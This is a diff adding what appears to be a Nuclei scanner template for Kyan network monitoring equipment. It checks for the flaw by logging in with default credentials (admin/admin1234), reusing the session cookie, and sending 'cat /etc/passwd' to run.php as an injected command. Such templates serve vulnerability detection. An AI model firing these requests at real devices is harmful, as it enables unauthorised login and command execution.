@@ -1,0 +1,53 @@
+id: poc-kyan-network-monitoring-equipment-run-php-rce
+info:
+  name: Kyan Network Monitoring Equipment run.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user=admin&passwd=admin1234&x=49&y=24
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: regex
+        part: header
+        regex:
+          - "Location: /index.php"
+    extractors:
+      - type: regex
+        name: session_cookie
+        internal: true
+        part: header
+        regex:
+          - "PHPSESSID=([0-9a-z]+)"
+  - raw:
+      - |
+        POST /run.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID={{session_cookie}}
+
+        command=cat+%2Fetc%2Fpasswd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "run"
+        condition: or
